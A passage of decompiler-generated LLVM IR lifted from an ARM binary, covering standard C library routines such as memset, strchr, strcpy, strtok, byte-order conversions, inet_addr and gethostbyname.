  %v0_acc0 = load i32, i32* @r0, align 4
  %v1_acc0 = load i32, i32* @r1, align 4
  %v2_acc0 = inttoptr i32 %v0_acc0 to i8*
  %v3_acc0 = call i32 @_memcpy(i8* %v2_acc0, i32 %v1_acc0)
  ret i32 %v3_acc0
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v8_acd4 = icmp eq i32 %arg3, 8
  store i1 %v8_acd4, i1* %cpsr_z.global-to-local, align 1
  %v5_acd8 = icmp slt i32 %arg3, 8
  br i1 %v5_acd8, label %dec_label_pc_ad38, label %dec_label_pc_acdc

dec_label_pc_acdc:                                ; preds = %entry
  %v4_acdc = mul i32 %arg2, 256
  %v5_acdc = or i32 %v4_acdc, %arg2
  %v4_ace0 = mul i32 %v5_acdc, 65536
  %v5_ace0 = or i32 %v4_ace0, %v5_acdc
  store i32 %v5_ace0, i32* @r1, align 4
  %v1_ace457 = urem i32 %tmp, 4
  %v2_ace458 = icmp eq i32 %v1_ace457, 0
  store i1 %v2_ace458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_ace458, label %dec_label_pc_acf4, label %bb

bb:                                               ; preds = %dec_label_pc_acdc, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_acdc ]
  %v3_ace859 = phi i32 [ %v6_ace8, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_acdc ]
  %v4_ace8 = inttoptr i32 %v3_ace859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_ace8, align 1
  %v5_ace8 = load i32, i32* @r3, align 4
  %v6_ace8 = add i32 %v5_ace8, 1
  store i32 %v6_ace8, i32* @r3, align 4
  %v0_acec.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_acf8.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_acec.pr, label %dec_label_pc_acf4, label %.thread

.thread:                                          ; preds = %bb
  %v2_acec = add i32 %v0_acf8.pr.pre, -1
  store i32 %v2_acec, i32* @r2, align 4
  %v1_ace4 = urem i32 %v6_ace8, 4
  %v2_ace4 = icmp eq i32 %v1_ace4, 0
  store i1 %v2_ace4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ace4, label %dec_label_pc_acf4, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_ace8.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_ace8.pre to i8
  br label %bb

dec_label_pc_acf4:                                ; preds = %.thread, %bb, %dec_label_pc_acdc
  %v0_ad0028 = phi i32 [ %tmp, %dec_label_pc_acdc ], [ %v6_ace8, %bb ], [ %v6_ace8, %.thread ]
  %v0_acf8.pr = phi i32 [ %arg3, %dec_label_pc_acdc ], [ %v0_acf8.pr.pre, %bb ], [ %v2_acec, %.thread ]
  %v0_acf4 = load i32, i32* @r1, align 4
  store i32 %v0_acf4, i32* @ip, align 4
  %v8_acf810 = icmp eq i32 %v0_acf8.pr, 8
  store i1 %v8_acf810, i1* %cpsr_z.global-to-local, align 1
  %v5_acfc11 = icmp slt i32 %v0_acf8.pr, 8
  br i1 %v5_acfc11, label %dec_label_pc_ad38, label %dec_label_pc_ad00.preheader

dec_label_pc_ad00.preheader:                      ; preds = %dec_label_pc_acf4
  %v1_ad0046 = inttoptr i32 %v0_ad0028 to i32*
  store i32 %v0_acf4, i32* %v1_ad0046, align 4
  %v3_ad0047 = add i32 %v0_ad0028, 4
  %v4_ad0048 = inttoptr i32 %v3_ad0047 to i32*
  %v5_ad0049 = load i32, i32* @ip, align 4
  store i32 %v5_ad0049, i32* %v4_ad0048, align 4
  %v6_ad0050 = add i32 %v0_ad0028, 8
  store i32 %v6_ad0050, i32* @r3, align 4
  %v0_ad0451 = load i32, i32* @r2, align 4
  %v1_ad0452 = add i32 %v0_ad0451, -8
  store i32 %v1_ad0452, i32* @r2, align 4
  %v5_ad0c53 = icmp slt i32 %v1_ad0452, 8
  br i1 %v5_ad0c53, label %dec_label_pc_ad00.dec_label_pc_ad38.loopexit_crit_edge, label %dec_label_pc_ad10

dec_label_pc_ad10:                                ; preds = %dec_label_pc_ad00.preheader, %dec_label_pc_acf8.dec_label_pc_ad00_crit_edge
  %v6_ad0055 = phi i32 [ %v6_ad00, %dec_label_pc_acf8.dec_label_pc_ad00_crit_edge ], [ %v6_ad0050, %dec_label_pc_ad00.preheader ]
  %v0_ad0054 = phi i32 [ %v12_ad2c, %dec_label_pc_acf8.dec_label_pc_ad00_crit_edge ], [ %v0_ad0028, %dec_label_pc_ad00.preheader ]
  %v1_ad10 = inttoptr i32 %v6_ad0055 to i32*
  %v2_ad10 = load i32, i32* @r1, align 4
  store i32 %v2_ad10, i32* %v1_ad10, align 4
  %v3_ad10 = add i32 %v0_ad0054, 12
  %v4_ad10 = inttoptr i32 %v3_ad10 to i32*
  %v5_ad10 = load i32, i32* @ip, align 4
  store i32 %v5_ad10, i32* %v4_ad10, align 4
  %v6_ad10 = add i32 %v0_ad0054, 16
  store i32 %v6_ad10, i32* @r3, align 4
  %v0_ad14 = load i32, i32* @r2, align 4
  %v1_ad14 = add i32 %v0_ad14, -8
  store i32 %v1_ad14, i32* @r2, align 4
  %v5_ad1c = icmp slt i32 %v1_ad14, 8
  br i1 %v5_ad1c, label %dec_label_pc_ad10.dec_label_pc_ad38.loopexit_crit_edge, label %dec_label_pc_ad20

dec_label_pc_ad20:                                ; preds = %dec_label_pc_ad10
  %v1_ad20 = inttoptr i32 %v6_ad10 to i32*
  %v2_ad20 = load i32, i32* @r1, align 4
  store i32 %v2_ad20, i32* %v1_ad20, align 4
  %v3_ad20 = add i32 %v0_ad0054, 20
  %v4_ad20 = inttoptr i32 %v3_ad20 to i32*
  %v5_ad20 = load i32, i32* @ip, align 4
  store i32 %v5_ad20, i32* %v4_ad20, align 4
  %v6_ad20 = add i32 %v0_ad0054, 24
  store i32 %v6_ad20, i32* @r3, align 4
  %v0_ad24 = load i32, i32* @r2, align 4
  %v1_ad24 = add i32 %v0_ad24, -8
  store i32 %v1_ad24, i32* @r2, align 4
  %v5_ad2c = icmp slt i32 %v1_ad24, 8
  br i1 %v5_ad2c, label %dec_label_pc_ad20.dec_label_pc_ad38.loopexit_crit_edge, label %dec_label_pc_acf8

dec_label_pc_acf8:                                ; preds = %dec_label_pc_ad20
  %v7_ad2c = inttoptr i32 %v6_ad20 to i32*
  %v8_ad2c = load i32, i32* @r1, align 4
  store i32 %v8_ad2c, i32* %v7_ad2c, align 4
  %v9_ad2c = add i32 %v0_ad0054, 28
  %v10_ad2c = inttoptr i32 %v9_ad2c to i32*
  %v11_ad2c = load i32, i32* @ip, align 4
  store i32 %v11_ad2c, i32* %v10_ad2c, align 4
  %v12_ad2c = add i32 %v0_ad0054, 32
  store i32 %v12_ad2c, i32* @r3, align 4
  %v6_ad30 = load i32, i32* @r2, align 4
  %v7_ad30 = add i32 %v6_ad30, -8
  store i32 %v7_ad30, i32* @r2, align 4
  %v5_acfc = icmp slt i32 %v7_ad30, 8
  br i1 %v5_acfc, label %dec_label_pc_acf8.dec_label_pc_ad38.loopexit_crit_edge, label %dec_label_pc_acf8.dec_label_pc_ad00_crit_edge

dec_label_pc_acf8.dec_label_pc_ad00_crit_edge:    ; preds = %dec_label_pc_acf8
  %v2_ad00.pre = load i32, i32* @r1, align 4
  %v1_ad00 = inttoptr i32 %v12_ad2c to i32*
  store i32 %v2_ad00.pre, i32* %v1_ad00, align 4
  %v3_ad00 = add i32 %v0_ad0054, 36
  %v4_ad00 = inttoptr i32 %v3_ad00 to i32*
  %v5_ad00 = load i32, i32* @ip, align 4
  store i32 %v5_ad00, i32* %v4_ad00, align 4
  %v6_ad00 = add i32 %v0_ad0054, 40
  store i32 %v6_ad00, i32* @r3, align 4
  %v0_ad04 = load i32, i32* @r2, align 4
  %v1_ad04 = add i32 %v0_ad04, -8
  store i32 %v1_ad04, i32* @r2, align 4
  %v5_ad0c = icmp slt i32 %v1_ad04, 8
  br i1 %v5_ad0c, label %dec_label_pc_ad00.dec_label_pc_ad38.loopexit_crit_edge, label %dec_label_pc_ad10

dec_label_pc_acf8.dec_label_pc_ad38.loopexit_crit_edge: ; preds = %dec_label_pc_acf8
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ad38

dec_label_pc_ad00.dec_label_pc_ad38.loopexit_crit_edge: ; preds = %dec_label_pc_acf8.dec_label_pc_ad00_crit_edge, %dec_label_pc_ad00.preheader
  %v1_ad04.lcssa = phi i32 [ %v1_ad0452, %dec_label_pc_ad00.preheader ], [ %v1_ad04, %dec_label_pc_acf8.dec_label_pc_ad00_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ad38

dec_label_pc_ad10.dec_label_pc_ad38.loopexit_crit_edge: ; preds = %dec_label_pc_ad10
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ad38

dec_label_pc_ad20.dec_label_pc_ad38.loopexit_crit_edge: ; preds = %dec_label_pc_ad20
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ad38

dec_label_pc_ad38:                                ; preds = %dec_label_pc_acf4, %dec_label_pc_acf8.dec_label_pc_ad38.loopexit_crit_edge, %dec_label_pc_ad00.dec_label_pc_ad38.loopexit_crit_edge, %dec_label_pc_ad10.dec_label_pc_ad38.loopexit_crit_edge, %dec_label_pc_ad20.dec_label_pc_ad38.loopexit_crit_edge, %entry
  %v0_ad40 = phi i32 [ %arg3, %entry ], [ %v1_ad24, %dec_label_pc_ad20.dec_label_pc_ad38.loopexit_crit_edge ], [ %v1_ad14, %dec_label_pc_ad10.dec_label_pc_ad38.loopexit_crit_edge ], [ %v1_ad04.lcssa, %dec_label_pc_ad00.dec_label_pc_ad38.loopexit_crit_edge ], [ %v7_ad30, %dec_label_pc_acf8.dec_label_pc_ad38.loopexit_crit_edge ], [ %v0_acf8.pr, %dec_label_pc_acf4 ]
  %v2_ad38 = icmp eq i32 %v0_ad40, 0
  store i1 %v2_ad38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ad38, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_ad38
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_ad38
  %v1_ad40 = sub i32 7, %v0_ad40
  store i32 %v1_ad40, i32* @r2, align 4
  %v3_ad44 = mul i32 %v1_ad40, 4
  %v4_ad44 = add i32 %v3_ad44, ptrtoint (i32* @global_var_ad4c.100 to i32)
  call void @__pseudo_branch(i32 %v4_ad44)
  %v0_ad4c = load i32, i32* @r1, align 4
  %v1_ad4c = trunc i32 %v0_ad4c to i8
  %v2_ad4c = load i32, i32* @r3, align 4
  %v3_ad4c = inttoptr i32 %v2_ad4c to i8*
  store i8 %v1_ad4c, i8* %v3_ad4c, align 1
  %v4_ad4c = load i32, i32* @r3, align 4
  %v5_ad4c = add i32 %v4_ad4c, 1
  store i32 %v5_ad4c, i32* %r3.global-to-local, align 4
  %v0_ad50 = load i32, i32* @r1, align 4
  %v1_ad50 = trunc i32 %v0_ad50 to i8
  %v3_ad50 = inttoptr i32 %v5_ad4c to i8*
  store i8 %v1_ad50, i8* %v3_ad50, align 1
  %v4_ad50 = load i32, i32* %r3.global-to-local, align 4
  %v5_ad50 = add i32 %v4_ad50, 1
  store i32 %v5_ad50, i32* %r3.global-to-local, align 4
  %v0_ad54 = load i32, i32* @r1, align 4
  %v1_ad54 = trunc i32 %v0_ad54 to i8
  %v3_ad54 = inttoptr i32 %v5_ad50 to i8*
  store i8 %v1_ad54, i8* %v3_ad54, align 1
  %v4_ad54 = load i32, i32* %r3.global-to-local, align 4
  %v5_ad54 = add i32 %v4_ad54, 1
  store i32 %v5_ad54, i32* %r3.global-to-local, align 4
  %v0_ad58 = load i32, i32* @r1, align 4
  %v1_ad58 = trunc i32 %v0_ad58 to i8
  %v3_ad58 = inttoptr i32 %v5_ad54 to i8*
  store i8 %v1_ad58, i8* %v3_ad58, align 1
  %v4_ad58 = load i32, i32* %r3.global-to-local, align 4
  %v5_ad58 = add i32 %v4_ad58, 1
  store i32 %v5_ad58, i32* %r3.global-to-local, align 4
  %v0_ad5c = load i32, i32* @r1, align 4
  %v1_ad5c = trunc i32 %v0_ad5c to i8
  %v3_ad5c = inttoptr i32 %v5_ad58 to i8*
  store i8 %v1_ad5c, i8* %v3_ad5c, align 1
  %v4_ad5c = load i32, i32* %r3.global-to-local, align 4
  %v5_ad5c = add i32 %v4_ad5c, 1
  store i32 %v5_ad5c, i32* %r3.global-to-local, align 4
  %v0_ad60 = load i32, i32* @r1, align 4
  %v1_ad60 = trunc i32 %v0_ad60 to i8
  %v3_ad60 = inttoptr i32 %v5_ad5c to i8*
  store i8 %v1_ad60, i8* %v3_ad60, align 1
  %v4_ad60 = load i32, i32* %r3.global-to-local, align 4
  %v5_ad60 = add i32 %v4_ad60, 1
  store i32 %v5_ad60, i32* %r3.global-to-local, align 4
  %v0_ad64 = load i32, i32* @r1, align 4
  %v1_ad64 = trunc i32 %v0_ad64 to i8
  %v3_ad64 = inttoptr i32 %v5_ad60 to i8*
  store i8 %v1_ad64, i8* %v3_ad64, align 1
  %v4_ad64 = load i32, i32* %r3.global-to-local, align 4
  %v5_ad64 = add i32 %v4_ad64, 1
  store i32 %v5_ad64, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_ad00, { 1, 0 }
  uselistorder i32 %v12_ad2c, { 1, 2, 0 }
  uselistorder i32 %v0_ad0054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_acf8.pr, { 0, 2, 1 }
  uselistorder i32 %v6_ace8, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_acdc, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 2, 1, 0, 3, 5, 9, 8, 4, 7 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ad38, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_ad10, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_ad74.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_ad74 = phi i32 [ %v0_ad74.pre, %bb ], [ %v5_ad74, %bb3 ]
  %v0_ad70 = phi i32 [ %tmp, %bb ], [ %v5_ad70, %bb3 ]
  %v1_ad70 = inttoptr i32 %v0_ad70 to i8*
  %v2_ad70 = load i8, i8* %v1_ad70, align 1
  %v1_ad74 = inttoptr i32 %v0_ad74 to i8*
  %v2_ad74 = load i8, i8* %v1_ad74, align 1
  %v3_ad74 = zext i8 %v2_ad74 to i32
  %v2_ad78 = icmp eq i8 %v2_ad70, 0
  br i1 %v2_ad78, label %.dec_label_pc_ad84_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_ad74 = add i32 %v0_ad74, 1
  %v5_ad70 = add i32 %v0_ad70, 1
  %v3_ad70 = zext i8 %v2_ad70 to i32
  %v10_ad7c = icmp eq i8 %v2_ad70, %v2_ad74
  br i1 %v10_ad7c, label %entry, label %dec_label_pc_ad84

.dec_label_pc_ad84_crit_edge:                     ; preds = %entry
  br label %dec_label_pc_ad84

dec_label_pc_ad84:                                ; preds = %bb3, %.dec_label_pc_ad84_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_ad84_crit_edge ], [ %v3_ad70, %bb3 ]
  %v2_ad84.pre-phi = sub nsw i32 %.pn, %v3_ad74
  ret i32 %v2_ad84.pre-phi

; uselistorder directives
  uselistorder i8 %v2_ad70, { 0, 2, 1 }
  uselistorder i32 %v0_ad70, { 1, 0 }
  uselistorder i32 %v0_ad74, { 1, 0 }
  uselistorder label %dec_label_pc_ad84, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_adf4 = urem i32 %arg1, 256
  %v0_ae143 = load i32, i32* @r0, align 4
  %v1_ae144 = urem i32 %v0_ae143, 4
  %v2_ae145 = icmp eq i32 %v1_ae144, 0
  br i1 %v2_ae145, label %dec_label_pc_ae1c, label %dec_label_pc_adfc

dec_label_pc_adfc:                                ; preds = %entry, %dec_label_pc_ae10
  %v0_ae10 = phi i32 [ %v1_ae10, %dec_label_pc_ae10 ], [ %v0_ae143, %entry ]
  %v1_adfc = inttoptr i32 %v0_ae10 to i8*
  %v2_adfc = load i8, i8* %v1_adfc, align 1
  %v3_adfc = zext i8 %v2_adfc to i32
  store i32 %v3_adfc, i32* @r3, align 4
  %v9_ae00 = icmp eq i32 %v3_adfc, %v1_adf4
  br i1 %v9_ae00, label %dec_label_pc_aed0, label %dec_label_pc_ae08

dec_label_pc_ae08:                                ; preds = %dec_label_pc_adfc
  %v2_ae08 = icmp eq i8 %v2_adfc, 0
  br i1 %v2_ae08, label %dec_label_pc_aecc, label %dec_label_pc_ae10

dec_label_pc_ae10:                                ; preds = %dec_label_pc_ae08
  %v1_ae10 = add i32 %v0_ae10, 1
  %v1_ae14 = urem i32 %v1_ae10, 4
  %v2_ae14 = icmp eq i32 %v1_ae14, 0
  br i1 %v2_ae14, label %dec_label_pc_ae1c, label %dec_label_pc_adfc

dec_label_pc_ae1c:                                ; preds = %dec_label_pc_ae10, %entry
  %v0_ae20 = phi i32 [ %v0_ae143, %entry ], [ %v1_ae10, %dec_label_pc_ae10 ]
  %v4_ae1c = mul nuw nsw i32 %v1_adf4, 256
  %v5_ae1c = or i32 %v4_ae1c, %v1_adf4
  %v4_ae24 = mul i32 %v5_ae1c, 65536
  %v5_ae24 = or i32 %v4_ae24, %v5_ae1c
  br label %dec_label_pc_ae28

dec_label_pc_ae28:                                ; preds = %dec_label_pc_aec4, %dec_label_pc_ae64, %dec_label_pc_ae1c
  %v0_ae8c = phi i32 [ %v0_ae20, %dec_label_pc_ae1c ], [ %v4_ae28, %dec_label_pc_ae64 ], [ %v4_ae28, %dec_label_pc_aec4 ]
  %v1_ae28 = inttoptr i32 %v0_ae8c to i32*
  %v2_ae28 = load i32, i32* %v1_ae28, align 4
  %v4_ae28 = add i32 %v0_ae8c, 4
  %v2_ae30 = xor i32 %v2_ae28, %v5_ae24
  %v2_ae34 = add i32 %v2_ae30, 2130640639
  store i32 %v2_ae34, i32* @ip, align 4
  %v2_ae3c = add i32 %v2_ae28, 2130640639
  %v1_ae40 = sub i32 -1, %v2_ae28
  %v2_ae44 = xor i32 %v2_ae3c, %v1_ae40
  %v2_ae50 = and i32 %v2_ae44, -2130640640
  store i32 %v2_ae50, i32* @r1, align 4
  %v2_ae58 = icmp eq i32 %v2_ae50, 0
  br i1 %v2_ae58, label %dec_label_pc_ae64, label %dec_label_pc_ae6c

dec_label_pc_ae64:                                ; preds = %dec_label_pc_ae28
  %v1_ae4c = sub i32 -1, %v2_ae30
  %v2_ae54 = xor i32 %v2_ae34, %v1_ae4c
  %v2_ae5c = and i32 %v2_ae54, -2130640640
  %v2_ae64 = icmp eq i32 %v2_ae5c, 0
  br i1 %v2_ae64, label %dec_label_pc_ae28, label %dec_label_pc_ae6c

dec_label_pc_ae6c:                                ; preds = %dec_label_pc_ae28, %dec_label_pc_ae64
  %v2_ae6c = inttoptr i32 %v0_ae8c to i8*
  %v3_ae6c = load i8, i8* %v2_ae6c, align 1
  %v4_ae6c = zext i8 %v3_ae6c to i32
  store i32 %v4_ae6c, i32* @r3, align 4
  %v9_ae70 = icmp eq i32 %v4_ae6c, %v1_adf4
  br i1 %v9_ae70, label %dec_label_pc_aed0, label %dec_label_pc_ae7c

dec_label_pc_ae7c:                                ; preds = %dec_label_pc_ae6c
  %v2_ae7c = icmp eq i8 %v3_ae6c, 0
  br i1 %v2_ae7c, label %dec_label_pc_aecc, label %dec_label_pc_ae84

dec_label_pc_ae84:                                ; preds = %dec_label_pc_ae7c
  %v1_ae84 = add i32 %v0_ae8c, 1
  %v2_ae84 = inttoptr i32 %v1_ae84 to i8*
  %v3_ae84 = load i8, i8* %v2_ae84, align 1
  %v4_ae84 = zext i8 %v3_ae84 to i32
  store i32 %v4_ae84, i32* @r3, align 4
  %v9_ae88 = icmp eq i32 %v4_ae84, %v1_adf4
  br i1 %v9_ae88, label %dec_label_pc_aed0, label %dec_label_pc_ae94

dec_label_pc_ae94:                                ; preds = %dec_label_pc_ae84
  %v2_ae94 = icmp eq i8 %v3_ae84, 0
  br i1 %v2_ae94, label %dec_label_pc_aecc, label %dec_label_pc_ae9c

dec_label_pc_ae9c:                                ; preds = %dec_label_pc_ae94
  %v1_ae9c = add i32 %v0_ae8c, 2
  %v2_ae9c = inttoptr i32 %v1_ae9c to i8*
  %v3_ae9c = load i8, i8* %v2_ae9c, align 1
  %v4_ae9c = zext i8 %v3_ae9c to i32
  store i32 %v4_ae9c, i32* @r3, align 4
  %v9_aea0 = icmp eq i32 %v4_ae9c, %v1_adf4
  br i1 %v9_aea0, label %dec_label_pc_aed0, label %dec_label_pc_aeac

dec_label_pc_aeac:                                ; preds = %dec_label_pc_ae9c
  %v2_aeac = icmp eq i8 %v3_ae9c, 0
  br i1 %v2_aeac, label %dec_label_pc_aecc, label %dec_label_pc_aeb4

dec_label_pc_aeb4:                                ; preds = %dec_label_pc_aeac
  %v1_aeb4 = add i32 %v0_ae8c, 3
  %v2_aeb4 = inttoptr i32 %v1_aeb4 to i8*
  %v3_aeb4 = load i8, i8* %v2_aeb4, align 1
  %v4_aeb4 = zext i8 %v3_aeb4 to i32
  store i32 %v4_aeb4, i32* @r3, align 4
  %v9_aeb8 = icmp eq i32 %v4_aeb4, %v1_adf4
  br i1 %v9_aeb8, label %dec_label_pc_aed0, label %dec_label_pc_aec4

dec_label_pc_aec4:                                ; preds = %dec_label_pc_aeb4
  %v2_aec4 = icmp eq i8 %v3_aeb4, 0
  br i1 %v2_aec4, label %dec_label_pc_aecc, label %dec_label_pc_ae28

dec_label_pc_aecc:                                ; preds = %dec_label_pc_ae08, %dec_label_pc_aec4, %dec_label_pc_aeac, %dec_label_pc_ae94, %dec_label_pc_ae7c
  br label %dec_label_pc_aed0

dec_label_pc_aed0:                                ; preds = %dec_label_pc_adfc, %dec_label_pc_aeb4, %dec_label_pc_ae9c, %dec_label_pc_ae84, %dec_label_pc_ae6c, %dec_label_pc_aecc
  %v1_aed4 = phi i32 [ 0, %dec_label_pc_aecc ], [ %v1_aeb4, %dec_label_pc_aeb4 ], [ %v1_ae9c, %dec_label_pc_ae9c ], [ %v1_ae84, %dec_label_pc_ae84 ], [ %v0_ae8c, %dec_label_pc_ae6c ], [ %v0_ae10, %dec_label_pc_adfc ]
  ret i32 %v1_aed4

; uselistorder directives
  uselistorder i32 %v4_ae28, { 1, 0 }
  uselistorder i32 %v2_ae28, { 0, 2, 1 }
  uselistorder i32 %v0_ae8c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_ae1c, { 1, 0 }
  uselistorder i32 %v1_ae10, { 1, 0, 2 }
  uselistorder i32 %v0_ae143, { 2, 1, 0 }
  uselistorder i32 %v1_adf4, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_aed0, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_aecc, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_ae6c, { 1, 0 }
  uselistorder label %dec_label_pc_adfc, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_aef01 = load i32, i32* @r1, align 4
  %v1_aef02 = inttoptr i32 %v0_aef01 to i8*
  %v2_aef03 = load i8, i8* %v1_aef02, align 1
  %v2_aef45 = icmp eq i8 %v2_aef03, 0
  store i1 %v2_aef45, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_aef03, i8* %arg1, align 1
  br i1 %v2_aef45, label %dec_label_pc_af00, label %dec_label_pc_aee8

dec_label_pc_aee8:                                ; preds = %entry, %dec_label_pc_aee8
  %v0_aee8 = load i32, i32* @r1, align 4
  %v1_aee8 = add i32 %v0_aee8, 1
  store i32 %v1_aee8, i32* @r1, align 4
  %v0_aeec = load i32, i32* %r2.global-to-local, align 4
  %v1_aeec = add i32 %v0_aeec, 1
  store i32 %v1_aeec, i32* %r2.global-to-local, align 4
  %v1_aef0 = inttoptr i32 %v1_aee8 to i8*
  %v2_aef0 = load i8, i8* %v1_aef0, align 1
  %v2_aef4 = icmp eq i8 %v2_aef0, 0
  store i1 %v2_aef4, i1* %cpsr_z.global-to-local, align 1
  %v3_aef8 = inttoptr i32 %v1_aeec to i8*
  store i8 %v2_aef0, i8* %v3_aef8, align 1
  %v0_aefc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_aefc, label %dec_label_pc_af00, label %dec_label_pc_aee8

dec_label_pc_af00:                                ; preds = %dec_label_pc_aee8, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_aee8, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 784), i32* @r2, align 4
  %v0_af1c = call i32 @strtok_r()
  ret i32 %v0_af1c
}

define i32 @__GI_htons(i32 %arg1) local_unnamed_addr {
entry:
  %v3_af34 = udiv i32 %arg1, 256
  %v1_af38 = mul i32 %arg1, 256
  %v4_af3c = and i32 %v1_af38, 65280
  %v5_af3c = or i32 %v4_af3c, %v3_af34
  ret i32 %v5_af3c
}

define i32 @__GI_htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_af5c = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_af5c
}

define i32 @__GI_ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v3_af64 = udiv i32 %arg1, 256
  %v1_af68 = mul i32 %arg1, 256
  %v4_af6c = and i32 %v1_af68, 65280
  %v5_af6c = or i32 %v4_af6c, %v3_af64
  ret i32 %v5_af6c
}

define i32 @__GI_ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_af8c = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_af8c
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_af9c = ptrtoint i32* %stack_var_-12 to i32
  %v0_afa0 = load i32, i32* @r0, align 4
  %v2_afa0 = inttoptr i32 %v0_afa0 to i8*
  %v3_afa0 = call i32 @inet_aton(i8* %v2_afa0, i32 %v2_af9c)
  %v2_afa4 = icmp eq i32 %v3_afa0, 0
  %v4_afa8 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_afa4, i32 -1, i32 %v4_afa8
  ret i32 %storemerge
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  store i32 2, i32* @r1, align 4
  %v0_afc8 = call i32 @__GI_gethostbyname2()
  ret i32 %v0_afc8
}

define i32 @__GI_gethostbyname2() local_unnamed_addr {
entry:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v3_afd8 = load i32, i32* @r4, align 4
  %v0_aff4 = load i32, i32* @r0, align 4
  %v3_aff8 = load i32, i32* @global_var_222ac.107, align 4
  %v0_affc = call i32 @__aeabi_read_tp()
  %v2_b004 = add i32 %v3_aff8, %v0_affc
  store i32 %v2_b004, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 788), i32* @r3, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 1228), i32* @r2, align 4
  %v1_b024 = call i32 @gethostbyname2_r(i32 %v0_aff4)
  store i32 %v3_afd8, i32* @r4, align 4
  ret i32 %tmp5
}

define i32 @function_b040(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_b040:
  %v0_b040 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_b040, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_b040
  %v2_b040 = load i32, i32* @r4, align 4
  %v8_b040 = shl i32 %v2_b040, %arg2
  %v9_b040 = and i32 %v8_b040, %arg1
  %v2_b044 = load i32, i32* @ip, align 4
  %v5_b044 = sdiv i32 %v2_b044, 512
  %v6_b044 = and i32 %v9_b040, %v5_b044
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_b040, %bb
  %v7_b044 = phi i32 [ %arg1, %dec_label_pc_b040 ], [ %v6_b044, %bb ]
  ret i32 %v7_b044

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
